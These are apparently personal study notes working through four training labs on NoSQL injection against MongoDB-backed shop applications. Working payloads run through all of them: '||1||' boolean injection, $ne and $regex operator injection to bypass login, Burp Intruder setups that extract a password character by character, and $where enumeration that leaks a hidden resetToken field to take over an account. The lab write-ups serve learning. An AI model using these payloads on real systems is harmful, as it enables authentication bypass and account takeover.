### What is it?
NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:
- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.

NoSQL databases store and retrieve data in a format other than traditional SQL relational tables. They use a wide range of query languages instead of a universal standard like SQL, and have fewer relational constraints.




---
>For Stages 2 + 3 (i think)
#### 1/2.1. Lab: Detecting NoSQL injection ⭕️
The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

1. Click on a filter like Accessories > append `'` single quote > Send > get a 500 Internal Server Error which *indicates some sort of possible SQLi*. It also showed a JavaScript syntax error.
	1. ![NoSQL injection-20260212231542983](NoSQL%20injection-20260212231542983.png)
2. Try `'+'` (must url encode it so it's `'%2b'`) and got a 200 OK. This is a JavaScript payload?
	1. ![NoSQL injection-20260212231731664](NoSQL%20injection-20260212231731664.png)
3. Use this payload to reveal all products and solve: `'||1||'`
	1. ![NoSQL injection-20260212231858946](NoSQL%20injection-20260212231858946.png)

How to ID:
- unauth shop > filter > no check stock > `'+order+by+1--` == 500 Internal Server Error AND a JavaScript syntax error `JSInterpreterFailure` > 
- Burp scan: SQL injection
---

####  2.2. Lab: Exploiting NoSQL operator injection to bypass authentication ⭕️
The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.
To solve the lab, log into the application as the `administrator` user.
You can log in to your own account using the following credentials: `wiener:peter`.

1. Replace `"wiener"` with `{"$ne":""}` and got a 302 meaning we bypassed authentication. `{"$regex":"wien.*"}` also works.
	1. ![NoSQL injection-20260212232949001](NoSQL%20injection-20260212232949001.png)
	2. ![NoSQL injection-20260212233011323](NoSQL%20injection-20260212233011323.png)
2. Set both username + password to `{"$ne":""}` and got an error "Query returned unexpected number of records".
	1. ![NoSQL injection-20260212233620068](NoSQL%20injection-20260212233620068.png)
3. Use the payload below to login as admin. Grab the session cookie > paste in cookie editor > save > refresh to solve the lab. Or right click > request in browser > in original session.
	1. ![NoSQL injection-20260212233804063](NoSQL%20injection-20260212233804063.png)

```
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```


How to ID:
- auth shop > change email > filter > no check stock > `'+order+by+1--` == 200 OK 
- `POST /login` uses `Content-Type: application/json` 

---

#### 2.3. Lab: Exploiting NoSQL injection to extract data ⭕️
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
To solve the lab, extract the password for the `administrator` user, then log in to their account.
You can log in to your own account using the following credentials: `wiener:peter`.

1. Send `GET /user/lookup?user=wiener` to Repeater. Append `'` single quote to `user` and got 200 OK but error "There was an error getting user details".
	1. ![NoSQL injection-20260212234347495](NoSQL%20injection-20260212234347495.png)
2. `'+'` but have to url encode it to `'%2b'` does not produce an error. **This confirms SQLi**.
	1. ![NoSQL injection-20260212234434114](NoSQL%20injection-20260212234434114.png)
3. Use `wiener'+%26%26+'1'%3d%3d'2` which is the url encoded version of `wiener' && '1'=='2` and got a message "Could not find user". This is false condition because 1 == 2 is false.
	1. ![NoSQL injection-20260212234657413](NoSQL%20injection-20260212234657413.png)
4. Change the `2` to a `1` thus making the statement true (1 == 1) and we got user info back. 
	1. ![NoSQL injection-20260212234808224](NoSQL%20injection-20260212234808224.png)
5. Now we append SQL queries in the `user` url param and if it's true we will see user info. If not, we should see "Could not find user". The payload below got user info back that means the admin's password is less than 30 characters.
	1. ![NoSQL injection-20260212235142579](NoSQL%20injection-20260212235142579.png)
```
administrator'+%26%26+this.password.length+<+30+||+'a'%3d%3d'b
```

6. When the integer was `9`, we got user info back. But when it is `8`, we got the "Could not find user" message meaning the password is 8 characters long.
	1. ![NoSQL injection-20260212235257638](NoSQL%20injection-20260212235257638.png)
7. Send to Intruder and enter the payload below to `user`. Cluster bomb attack > add positions to 0 and a. Set payload position `1 - 0` to Numbers: From 0 To 7. Set `2 - a` to Simple list and Add from list `a-z`. 
	1. *The hint is that the password is only lowercase letters*.
	2. ![NoSQL injection-20260212235924534](NoSQL%20injection-20260212235924534.png)
```
administrator'+%26%26+this.password[0]%3d%3d'a
```

8. Login with `administrator:uqldjspt` to solve.
	1. ![NoSQL injection-20260212235732791](NoSQL%20injection-20260212235732791.png)


How to ID:
- auth shop > change email > filter > no check stock > csrf token in `POST /login` > 
- `Your username is: wiener (role: user)`
- `GET /user/lookup?user=wiener`

---

#### 1/2.4 Lab: Exploiting NoSQL operator injection to extract unknown fields ⭕️
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
To solve the lab, log in as `carlos`.

1. Login as `carlos:aaa` and got "Invalid username or password" (no period). Send `POST /login` to Repeater. Put this payload `{"$ne":"invalid"}` for `password` and got 200 OK with "Account locked: please reset your password".
	1. *This response indicates that the `$ne` operator has been accepted and the application is vulnerable.*
	2. ![NoSQL injection-20260213102155641](NoSQL%20injection-20260213102155641.png)
2. Forgot password > enter carlos > "Please check your email for a reset password link." so we can't reset the password without carlos's email.
	1. ![NoSQL injection-20260213102337286](NoSQL%20injection-20260213102337286.png)
3. Test for JavaScript injection vulnerability:
	1. Enter the payload below and notice "Invalid username or password"
		1. ![NoSQL injection-20260213102505579](NoSQL%20injection-20260213102505579.png)
	2. Change `0` to `1` and notice a different error: "Account locked..." *This indicates that the JavaScript in the `$where` clause is being evaluated.*
		1. ![NoSQL injection-20260213102528152](NoSQL%20injection-20260213102528152.png)
```
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

4. Send to Intruder > replace `"$where"` with `"$where":"Object.keys(this)[1].match('^.{}.*')"` and add 2 payload positions.
	1. ![NoSQL injection-20260213103253446](NoSQL%20injection-20260213103253446.png)
5. Payload position 1 > Numbers > 0-20. Payload position 2 > Simple list > Add `a-z`, `A-Z`, `0-9`. Start Attack. Sort Payload 1 then sort Length (click twice). It will spell out username. So `[1]` is username.
	1. ![NoSQL injection-20260213103325736](NoSQL%20injection-20260213103325736.png)
	2. ![NoSQL injection-20260213103443428](NoSQL%20injection-20260213103443428.png)
6. Replace `"$where"` to `"$where":"Object.keys(this)**[2]**.match('^.{}.*')"` and add 2 payload positions. Using `[2]` will get us password.
	1. ![NoSQL injection-20260213103552111](NoSQL%20injection-20260213103552111.png)
	2. ![NoSQL injection-20260213103723236](NoSQL%20injection-20260213103723236.png)
7. `[3]` will get us `email` but `[4]` gets us `resetToken`. **Which is the name of the unknown parameter we need**.
	1. ![NoSQL injection-20260213103921843](NoSQL%20injection-20260213103921843.png)
8. Verify the unknown parameter name:
	1. Send `GET /forgot-password` to Repeater. Put `?foo=invalid` as `foo` would be an example parameter name and got 200 OK.
		1. ![NoSQL injection-20260213104110019](NoSQL%20injection-20260213104110019.png)
	2. But `?resetToken=invalid` got a 400 Bad Request meaning this is the correct parameter name.
		1. ![NoSQL injection-20260213104151435](NoSQL%20injection-20260213104151435.png)
9. Intruder > enter `"$where":"this.YOURTOKENNAME.match('^.{}.*')"` and replace `YOURTOKENNAME` with `resetToken`. Add the 2 payload positions. Sort payload 1 then click Length twice. We now have the reset token: `4436b5772e2da279`.
	1. ![NoSQL injection-20260213104317370](NoSQL%20injection-20260213104317370.png)
	2. ![NoSQL injection-20260213104415184](NoSQL%20injection-20260213104415184.png)
```
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.resetToken.match('^.{}.*')"}
```

10. Repeater > set the reset token like the screenshot > DON'T HIT SEND > right click > request in browser > in original session > you will see a password reset page > enter `peter` > login as `carlos:peter` to solve.
	1. ![NoSQL injection-20260213104647954](NoSQL%20injection-20260213104647954.png)
	2. ![NoSQL injection-20260213104609725](NoSQL%20injection-20260213104609725.png)


How to ID:
- auth shop > change email > filter > no check stock > NO csrf token in `POST /login` >  
- Forgot password?
- `POST /login` uses `Content-Type: application/json` 
- carlos:aaa "Invalid username or password" (no period) 
- payload got "Account locked: please reset your password"


